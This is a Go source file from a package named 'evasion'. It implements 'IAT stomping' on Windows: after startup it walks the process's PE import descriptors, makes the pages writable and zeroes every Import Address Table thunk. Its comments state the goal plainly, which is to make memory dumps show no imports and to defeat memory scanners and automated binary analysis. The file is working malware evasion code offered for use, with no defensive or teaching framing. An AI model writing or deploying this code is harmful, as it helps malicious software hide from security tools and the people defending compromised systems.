//go:build windows
// +build windows

package evasion

// IAT stomping — zeroes the Import Address Table entries of the current
// process image after startup is complete.
//
// Why: memory scanners can read the IAT to enumerate what APIs a process
// imported. After stomping, the entries are 0 — a dump shows no imports.
// The code still works because Go calls via its own internal stubs
// (the lazy DLL procs in windows.NewLazySystemDLL cache the real addr
// separately), not via the PE IAT at runtime.
//
// Stomped IAT also frustrates automated binary analysis that relies on
// static import enumeration of a live memory dump.

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// iatStomp zeroes all thunks in the current process's Import Directory.
func iatStomp() {
	var base windows.Handle
	_ = windows.GetModuleHandleEx(0, nil, &base)
	if base == 0 {
		return
	}
	b := uintptr(base)

	e_lfanew := *(*uint32)(unsafe.Pointer(b + 0x3C))
	// DataDirectory[1] = Import Directory, at PE+0x90 (PE32+)
	importRVA := *(*uint32)(unsafe.Pointer(b + uintptr(e_lfanew) + 0x90))
	if importRVA == 0 {
		return
	}

	// IMAGE_IMPORT_DESCRIPTOR is 20 bytes:
	//   +0x00  OriginalFirstThunk  RVA  (INT)
	//   +0x04  TimeDateStamp       DWORD
	//   +0x08  ForwarderChain      DWORD
	//   +0x0C  Name                RVA
	//   +0x10  FirstThunk          RVA  (IAT)
	// Array ends with an all-zero entry.
	const descSize = 20
	for i := uintptr(0); ; i += descSize {
		desc := b + uintptr(importRVA) + i
		iatRVA := *(*uint32)(unsafe.Pointer(desc + 0x10))
		if iatRVA == 0 {
			break
		}
		// Walk the IAT thunk array (8-byte entries on x64), zero each.
		iat := b + uintptr(iatRVA)
		old, ok := ntProtect(iat, 0x1000, windows.PAGE_READWRITE)
		if !ok {
			continue
		}
		for j := uintptr(0); ; j += 8 {
			thunk := iat + j
			val := *(*uint64)(unsafe.Pointer(thunk))
			if val == 0 {
				break
			}
			*(*uint64)(unsafe.Pointer(thunk)) = 0
		}
		ntProtect(iat, 0x1000, old)
	}
}
